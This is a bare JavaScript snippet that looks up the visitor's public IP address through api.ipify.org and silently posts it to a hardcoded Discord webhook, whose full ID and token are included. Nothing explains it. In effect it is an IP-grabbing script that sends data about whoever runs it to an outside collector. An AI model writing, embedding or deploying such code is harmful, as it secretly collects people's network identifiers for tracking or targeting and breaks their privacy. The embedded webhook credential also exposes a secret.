fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    fetch('https://discord.com/api/webhooks/1407015077449830440/gYTTRMAVId9hSA-jnAQV6AA1W2Ew5YKKYeAH5psuuaFMTNXne10rwUdNCUQDwYvOYpsm', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
  });